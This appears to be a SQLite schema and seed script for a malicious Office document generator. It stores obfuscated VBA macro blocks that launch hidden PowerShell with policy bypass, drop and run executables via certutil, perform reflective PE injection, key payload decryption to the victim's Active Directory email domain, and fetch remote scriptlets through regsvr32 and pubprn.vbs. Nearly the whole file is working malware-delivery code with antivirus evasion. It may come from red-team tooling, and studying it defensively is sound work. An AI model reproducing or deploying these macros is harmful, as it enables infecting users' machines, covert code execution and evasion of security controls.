PRAGMA journal_mode = OFF;

CREATE TABLE `PayloadTypes` (
	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`Name`	        TEXT NOT NULL,
	`Description`	TEXT
);

CREATE TABLE `Payloads` (
	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`Name`	        TEXT NOT NULL UNIQUE,
	`Description`	TEXT,
	`TargetIP`  	TEXT,
	`TargetPort`	TEXT,
	`PayloadType`   INTEGER NOT NULL,
	`PayloadText`	TEXT NOT NULL,
    `NumBlocks`     INTEGER,
    FOREIGN KEY(PayloadType)    REFERENCES PayloadTypes(ID)
);  

CREATE TABLE 'InfectionTypes' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`Name`	        TEXT NOT NULL UNIQUE,
    `Description`	TEXT
);

CREATE TABLE 'DocTypes' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`Name`	        TEXT NOT NULL UNIQUE
);

CREATE TABLE 'Assoc_Infection_DocType' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`DocType`       INTEGER NOT NULL,
    `InfectionType` INTEGER NOT NULL,
    FOREIGN KEY(DocType)    REFERENCES DocTypes(ID),
    FOREIGN KEY(InfectionType)  REFERENCES InfectionTypes(ID)
);

CREATE TABLE 'Assoc_Infection_Payload' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
	`PayloadType`   INTEGER NOT NULL,
    `InfectionType` INTEGER NOT NULL,
    FOREIGN KEY(PayloadType)    REFERENCES PayloadTypes(ID),
    FOREIGN KEY(InfectionType)  REFERENCES InfectionTypes(ID)
);

CREATE TABLE 'ActiveWorking' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `PayloadID`     INTEGER NOT NULL,
    `InfectionType` INTEGER NOT NULL,
    `LegendString`  TEXT,
    `IsEncrypted`   INTEGER NOT NULL,
    `EncryptedText` TEXT,
    `CustomStrings` TEXT,
    FOREIGN KEY(PayloadID)      REFERENCES Payloads(ID),
    FOREIGN KEY(InfectionType)  REFERENCES InfectionTypes(ID)
);

CREATE TABLE `CodeBlocks` (
	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `Name`          TEXT NOT NULL,
    `BlockType`     TEXT NOT NULL,
	`BlockText`	    TEXT NOT NULL
);

-- Future Feature
CREATE TABLE `Templates` (
	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `Name`          TEXT NOT NULL,
    `DocType`       TEXT NOT NULL,
	`TemplateText`	TEXT NOT NULL
);

-- Future Feature
CREATE TABLE `SavedAttacks` (
	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `AttackID`      INTEGER NOT NULL,
    `PayloadID`     INTEGER NOT NULL,
    `InfectionType` INTEGER NOT NULL,
    FOREIGN KEY(PayloadID)      REFERENCES Payloads(ID),
    FOREIGN KEY(InfectionType)  REFERENCES InfectionTypes(ID)
);

-- Future Feature
CREATE TABLE 'Assoc_SavedAttacks_Templates' (
    `ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `AttackID`      INTEGER NOT NULL,
    `TemplateID`	INTEGER NOT NULL,
    FOREIGN KEY(AttackID)       REFERENCES SavedAttacks(AttackID),
    FOREIGN KEY(TemplateID)     REFERENCES Templates(ID)
);

CREATE TABLE `InfectionType_Dependencies` (
    `ID`            INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
    `InfectionType` INTEGER NOT NULL,
    `CodeBlockID`   INTEGER NOT NULL,
    FOREIGN KEY(InfectionType)  REFERENCES InfectionTypes(ID),
    FOREIGN KEY(CodeBlockID)    REFERENCES CodeBlocks(ID)
);

------------------ LEGEND ------------------

-- PAYLOADTYPE      1: Shell-Command
-- PAYLOADTYPE      2: PowerShell Script
-- PAYLOADTYPE      3: Executable

-- INFECTIONTYPE    1: Shell Command
-- INFECTIONTYPE    2: Cell Embed
-- INFECTIONTYPE    3: Cell Embed - Non Base64
-- INFECTIONTYPE    4: Cell Embed - Encrypted
-- INFECTIONTYPE    5: CertUtil
-- INFECTIONTYPE    6: Save To Disk & Run
-- INFECTIONTYPE    7: Run In Memory
-- INFECTIONTYPE    8: Metadata
-- INFECTIONTYPE    9: Cell Embed - Obfuscated
-- INFECTIONTYPE   10: Pubprn.vbs

-- DOCTYPES         1: xls
-- DOCTYPES         2: doc
-- DOCTYPES         3: ppt

-- CODEBLOCK        1: GetVal                   util
-- CODEBLOCK        2: RandomName               util
-- CODEBLOCK        3: CertUtil                 util
-- CODEBLOCK        4: Sleep                    declare
-- CODEBLOCK        5: CertUtil                 harnass
-- CODEBLOCK        6: CellEmbed                harnass
-- CODEBLOCK        7: CellEmbedNonb64          harnass
-- CODEBLOCK        8: DecodeB64                util
-- CODEBLOCK        9: WriteFileFromBytes       util      
-- CODEBLOCK        10: SaveToDisk              harnass
-- CODEBLOCK        11: GetEmail                util
-- CODEBLOCK        12: Crypto                  util
-- CODEBLOCK        13: ShellCommand            harnass
-- CODEBLOCK        14: PSCellEmbedEncrypted    harnass
-- CODEBLOCK        15: WriteFile               util
-- CODEBLOCK        16: ReflectivePE            harnass
-- CODEBLOCK        17: Metadata-XLS            harnass
-- CODEBLOCK        18: Metadata-DOC            harnass
-- CODEBLOCK        19: Pubprn.vbs              harnass

-------------------------------------------

INSERT INTO DocTypes (Name) VALUES ('xls');
INSERT INTO DocTypes (Name) VALUES ('doc');
-- INSERT INTO DocTypes (Name) VALUES ('ppt'); Maybe Soon. :-)

INSERT INTO PayloadTypes (Name, Description) VALUES ('Shell Command', 'Standard shell command. Uses Wscript.Shell to fire the command exactly as is. Be sure your escapes are correct. <evilgrin>');
INSERT INTO PayloadTypes (Name, Description) VALUES ('PowerShell Script', 'A standard, non-base64 encoded powershell script to run');
INSERT INTO PayloadTypes (Name, Description) VALUES ('Executable', 'Embeds an EXE into cells & fires');    
INSERT INTO PayloadTypes (Name, Description) VALUES ('COM Scriptlet', 'A URL to a hosted COM Scriptlet file.'); 

INSERT INTO InfectionTypes (Name, Description) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.');                                                                              --1
INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed', 'Your "go to" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.');                        --2
INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed-nonB64', 'Embeds .ps1 into cells (no b64). Does NOT save payload to disk. Fires directly with powershell.exe. Recommended.');                                                                    --3
INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed-Encrypted', 'Embeds encrypted .ps1 into cells (no b64). Does NOT save payload to disk. Key is the user''s email domain (retrieved from AD). Fired directly with powershell.exe. Careful to escape properly.');   --4
INSERT INTO InfectionTypes (Name, Description) VALUES ('Certutil', 'Saves base64 encoded exe to text file then uses certutil to fire it. Thanks @mattifestation!');                                                                                                 --5
INSERT INTO InfectionTypes (Name, Description) VALUES ('Save To Disk', 'Saves exe to disk (%APPDATA%) then fires.');                                                                                                                                                --6
INSERT INTO InfectionTypes (Name, Description) VALUES ('ReflectivePE', 'Saves b64 encoded PE as a text file then uses Invoke-ReflectivePEInjection to fire it');   --7
INSERT INTO InfectionTypes (Name, Description) VALUES ('Metadata', 'Saves your shell command to the `Subject` field of the metadata. Good for empire stagers!');  --8
INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed-Obfuscated', 'Obfuscates PowerShell based payload using Invoke-Obfuscation');  --9
INSERT INTO InfectionTypes (Name, Description) VALUES ('Pubprn.vbs', 'Fires your hosted COM scriptlet through pubprn.vbs (Microsoft signed)');  --10
INSERT INTO InfectionTypes (Name, Description) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/'); --11
INSERT INTO InfectionTypes (Name, Description) VALUES ('Regsrv32', 'Fires your hosted COM scriptlet through regsrv32 (Microsoft signed)');  --12
--INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/');                                                                           --7
--INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Encrypted', 'Embeds encrypted payload into cells. When user Enablez Content, key is retrieved and the payload is decrypted, saved to disk, then fired.');                                                   --8

-- Associate infection types to payloads
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 1);     -- Shell Command & Shell Command 
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 2);     -- Powershell Script & CellEmbed
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 3);     -- Powershell Script & CellEmbedNonBase64
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 4);     -- Powershell Script & CellEmbed-Encrypted
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 5);     -- Exe & CertUtil
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 6);     -- Exe & SaveToDisk
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 7);     -- Exe & ReflectivePE
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 8);     -- ShellCommand & Metadata
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 11);     -- ShellCommand & DDE
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 9);     -- PowerShell & CellEmbed-Obfuscated
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 10);     -- COM Scriptlet & pubprn.vbs
INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 12);     -- COM scriptlet & Regsrv32
--INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 9);     -- ShellCommand & DDE


-- Associate infection types to document types
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 1); -- XLS & Shell Command
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 2); -- XLS & CellEmbed
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 3); -- XLS & CellEmbed-Nonb64
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 4); -- XLS & CellEmbed-Encrypted
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 5); -- XLS & CertUtil
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 6); -- XLS & SaveToDisk
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 7); -- XLS & ReflectivePE
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 8); -- XLS & Metadata
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 9); -- XLS & CellEmbed-Obfuscation
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 10); -- XLS & pubprn.vbs
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 11); -- XLS & DDE
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 12); -- XLS & Regsrv32
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 1); -- DOC & Shell Command
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 8); -- DOC & MetaData
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 10); -- DOC & pubprn.vbs
INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 12); -- DOC & Regsrv32


-- 1
INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('GetVal', 'util', '
Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function

');

-- 2
INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('RandomName', 'util', '
Function GetRand()
    Dim r As String
    Dim i As Integer
     
    Randomize
    For i = 1 To 8
        If i Mod 2 = 0 Then
            r = Chr(Int((90 - 65 + 1) * rnd + 65)) & r
        Else
            r = Int((9 * rnd) + 1) & r
        End If
    Next i
    GetRand = r
End Function

');

-- 3
INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', '
Sub cutil(code As String)
    Dim x As String
    
    x = "-----BEG" & "IN CER" & "TIFICATE-----"
    x = "-----BEG" & "IN CER" & "TIFI" & "CATE-----"
    x = x + vbNewLine
    x = x + code
    x = x + vbNewLine
    x = x + "-----E" & "ND CERTIF" & "ICATE-----"
    
    Dim path As String
    path = Application.UserLibraryPath & rndname & ".txt"
    expath = Application.UserLibraryPath & rndname & ".exe"
    
    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
    path = Application.UserLibraryPath & GetRand & ".txt"
    expath = Application.UserLibraryPath & GetRand & ".exe"
    
    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemOb" & "ject")
    Set file = scr.CreateTextFile(path, True)
    file.Write x
    file.Close

    Shell (Chr(99) & Chr(101) & Chr(114) & Chr(116) & Chr(117) & Chr(116) & Chr(105) & Chr(108) & Chr(32) & _
    Chr(45) & Chr(100) & Chr(101) & Chr(99) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & path & " " & expath)
    Sleep 2000
    Shell (expath)
End Sub

');

-- 4
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Sleep', 'declare', '
#If VBA7 Then
    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr) 
#Else
    Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) 
#End If

');

--5
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('CertUtil', 'harness', '
Sub |RANDOMNAME|()
    Dim p As String
    p = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
    cutil(p)
End Sub

');

--6
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbed', 'harness', '
Sub |RANDOMNAME|()
    Dim x, c As String
    x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -no" & "p -n" & "oni " & _
    "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
    "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & "" & _
    " -e" & "nc " & x
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub

');

--7, 9
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbedNonb64', 'harness', '
Sub |RANDOMNAME|()
    Dim x, c As String
    x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
    x = Replace(x, """", "\""")
    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle 1 -command " & Chr(34) & x & Chr(34)
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub

');

--8
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('DecodeBase64', 'util', '
Function dec(b64)
    Dim DM, EL
    Set DM = CreateObject(Chr(77) & Chr(105) & Chr(99) & Chr(114) & Chr(111) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(46) & Chr(88) & Chr(77) & Chr(76) & Chr(68) & Chr(79) & Chr(77))
    Set EL = DM.createElement(Chr(116) & Chr(109) & Chr(112))
    EL.DataType = Chr(98) & Chr(105) & Chr(110) & Chr(46) & Chr(98) & Chr(97) & Chr(115) & Chr(101) & Chr(54) & Chr(52)
    EL.Text = b64
    dec = EL.NodeTypedValue
End Function

');

--9
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFileFromBytes', 'util', '
Sub rit(file, bytes)
    Dim b
    Set b = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(83) & Chr(116) & Chr(114) & Chr(101) & Chr(97) & Chr(109))
    b.Type = 1
    b.Open
    b.Write bytes
    b.SaveToFile file, 2
End Sub

');

--10
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('SaveToDisk', 'harness', '
Sub |RANDOMNAME|()
    Dim p, pth As String
    Dim b
    pth = Application.UserLibraryPath & GetRand & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    p = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
    b = dec(p)
    Call rit(pth, b)
    Shell (pth)
End Sub

');

--11
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('GetEmail', 'util', '
Function em()
    Dim retval
    Set obR = GetObject(Chr(76) & Chr(68) & Chr(65) & Chr(80) & Chr(58) & Chr(47) & Chr(47) & Chr(114) & Chr(111) & Chr(111) & Chr(116) & Chr(68) & Chr(83) & Chr(69))
    rtdns = obR.Get(Chr(114) & Chr(111) & Chr(111) & Chr(116) & Chr(68) & Chr(111) & Chr(109) & Chr(97) & Chr(105) & Chr(110) & Chr(78) & Chr(97) & Chr(109) & Chr(105) & Chr(110) & Chr(103) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(120) & Chr(116))

    Set con = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(67) & Chr(111) & Chr(110) & Chr(110) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
    Set com = CreateObject(Chr(65) & Chr(68) & Chr(79) & Chr(68) & Chr(66) & Chr(46) & Chr(67) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & Chr(110) & Chr(100))
    con.Provider = Chr(65) & Chr(68) & Chr(115) & Chr(68) & Chr(83) & Chr(79) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116)
    con.Open Chr(65) & Chr(99) & Chr(116) & Chr(105) & Chr(118) & Chr(101) & Chr(32) & Chr(68) & Chr(105) & Chr(114) & Chr(101) & Chr(99) & Chr(116) & Chr(111) & Chr(114) & Chr(121) & Chr(32) & Chr(80) & Chr(114) & Chr(111) & Chr(118) & Chr(105) & Chr(100) & Chr(101) & Chr(114)
    Set com.ActiveConnection = con
    
    com.CommandText = Chr(83) & Chr(101) & Chr(108) & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(100) & Chr(105) & Chr(115) & Chr(116) & Chr(105) & Chr(110) & Chr(103) & Chr(117) & Chr(105) & _
        Chr(115) & Chr(104) & Chr(101) & Chr(100) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(44) & Chr(109) & Chr(97) & Chr(105) & Chr(108) & Chr(32) & Chr(70) & Chr(114) & Chr(111) & Chr(109) & _
        Chr(32) & Chr(39) & Chr(76) & Chr(68) & Chr(65) & Chr(80) & Chr(58) & Chr(47) & Chr(47) & rtdns & Chr(39) & Chr(32) & Chr(119) & Chr(104) & Chr(101) & Chr(114) & Chr(101) & Chr(32) & _
        Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(67) & Chr(108) & Chr(97) & Chr(115) & Chr(115) & Chr(61) & Chr(39) & Chr(117) & Chr(115) & Chr(101) & Chr(114) & _
        Chr(39) & Chr(32) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(115) & Chr(97) & Chr(109) & Chr(65) & Chr(99) & Chr(99) & Chr(111) & Chr(117) & Chr(110) & Chr(116) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(61) & Chr(39) & _
        (Environ$(Chr(85) & Chr(115) & Chr(101) & Chr(114) & Chr(110) & Chr(97) & Chr(109) & Chr(101))) & Chr(39)

    com.Properties(Chr(83) & Chr(101) & Chr(97) & Chr(114) & Chr(99) & Chr(104) & Chr(115) & Chr(99) & Chr(111) & Chr(112) & Chr(101)) = 2
    Set ors = com.Execute
    
    Dim m
    If Not ors.EOF Then
        ors.MoveFirst
        If Not ors.Fields(Chr(109) & Chr(97) & Chr(105) & Chr(108)) Is Nothing Then
            m = ors.Fields(Chr(109) & Chr(97) & Chr(105) & Chr(108))
        End If
    End If
    con.Close
    If Not IsNull(m) Then
        retval = Split(m, Chr(64))(1)
    Else
        retval = ""
    End If
    em = retval
End Function

');

--12
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Crypto', 'util', '
Public Function cript(sText As String, sKey As String) As String
    Dim baS(0 To 255) As Byte
    Dim baK(0 To 255) As Byte
    Dim bytSwap     As Byte
    Dim lI          As Long
    Dim lJ          As Long
    Dim lIdx        As Long

    For lIdx = 0 To 255
        baS(lIdx) = lIdx
        baK(lIdx) = Asc(Mid$(sKey, 1 + (lIdx Mod Len(sKey)), 1))
    Next
    For lI = 0 To 255
        lJ = (lJ + baS(lI) + baK(lI)) Mod 256
        bytSwap = baS(lI)
        baS(lI) = baS(lJ)
        baS(lJ) = bytSwap
    Next
    lI = 0
    lJ = 0
    For lIdx = 1 To Len(sText)
        lI = (lI + 1) Mod 256
        lJ = (lJ + baS(lI)) Mod 256
        bytSwap = baS(lI)
        baS(lI) = baS(lJ)
        baS(lJ) = bytSwap
        cript = cript & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
    Next
End Function

Function phc(ByVal lI As Long, ByVal lJ As Long) As Long
    If lI = lJ Then
        phc = lJ
    Else
        phc = lI Xor lJ
    End If
End Function

Public Function CalcBusiness(sText As String) As String
    Dim lIdx As Long

    For lIdx = 1 To Len(sText)
        CalcBusiness = CalcBusiness & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
    Next
End Function

Public Function GetBusiness(sText As String) As String
    Dim lIdx As Long

    For lIdx = 1 To Len(sText) Step 2
        GetBusiness = GetBusiness & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
    Next
End Function

');

--13
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
Sub |RANDOMNAME|()
    Dim c As String
    c = |PAYLOADTEXT|
    Shell(c)
End Sub

');

--14
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbedEncrypted', 'harness', '
Sub |RANDOMNAME|()
    Dim x,k,p As String
    x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
    k = em()
    p = cript(GetBusiness(CStr(x)), CStr(k))
    p = Replace(p, """", "\""")
    Dim c As String
    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
    Chr(111) & Chr(112) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & _ 
    Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & Chr(100) & Chr(101) & Chr(110) & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & _
    Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(34) & p & Chr(34)
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub

');

--15
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
Function cfile(b As String)
    pth = Application.UserLibraryPath & GetRand & ".txt"
    Dim f As Object
    Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
    Dim oF As Object
    Set oF = f.CreateTextFile(pth)
    oF.WriteLine b
    oF.Close
    cfile = pth
End Function

');

--16
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ReflectivePE', 'harness', '
Sub |RANDOMNAME|()
    Dim x, irpei, c, p1, p2 As String
    p1 = cfile(CStr(GetVal(|IRPEISTARTROW|, |IRPEIENDROW|, |IRPEICOLUMN|)))
    p2 = cfile(CStr(GetVal(|STARTROW|, |ENDROW|, |COLUMN|)))
    c = "cm" & "d /c " & Chr(34) & "%SystemRoot%\|SYSTYPE|\Window" & "sPowe" & "rShe" & "ll\v1.0\" & Chr(112) & Chr(79) & _
    Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & _
    Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & _
    Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & "|DEMOMODE|" & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & _
    Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(112) & Chr(32) & Chr(45) & _
    Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
    Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
    ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
    "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34) & _
    "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub

');

--17
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Metadata-XLS', 'harness', '
Function |RANDOMNAME|()
    Shell (ActiveWorkbook.BuiltinDocumentProperties.Item("Subject"))
End Function

');

--18
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Metadata-DOC', 'harness', '
Function |RANDOMNAME|()
    Shell (ThisDocument.BuiltinDocumentProperties.Item("Subject"))
End Function

');

--19
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PUBPRN', 'harness', '
Function |RANDOMNAME|()
    Dim q As String
    q = "cs" & "crip" & "t C:\Wind" & "ows\Sys" & "tem32\Print" & "ing_Admin_Scri" & "pts\en-US\pub" & "prn.v" & "bs localhost script:|URL|"
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run q, 0
End Function

');

--20
INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('REGSRV32', 'harness', '
Function |RANDOMNAME|()
    Dim q As String
    q= "r*eg*sv*r3*2 /s /n /u /i:|URL| sc*r*o*b*j.dl*l"
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run Replace(q, "*", ""), 0
End Function

'); 



INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (2, 1);  -- CellEmbed                depends on GetVal
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (2, 2);  -- CellEmbed                depends on RandomName
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (3, 1);  -- CellEmbed-Nonb64         depends on RandomName
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (4, 1);  -- CellEmbed-Encrypted      depends on GetVal
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (4, 11); -- CellEmbed-Encrypted      depends on GetEmail
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (4, 12); -- CellEmbed-Encrypted      depends on Crypt
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (5, 1);  -- CertUtil                 depends on GetVal
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (5, 2);  -- CertUtil                 depends on RandomName
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (5, 3);  -- CertUtil                 depends on cutil
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (5, 4);  -- CertUtil                 depends on Sleep
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (6, 1);  -- SaveToDisk               depends on GetVal
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (6, 2);  -- SaveToDisk               depends on RandomName
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (6, 8);  -- SaveToDisk               depends on DecodeBase64
INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (6, 9);  -- SaveToDisk               depends on WriteFileFromBytes
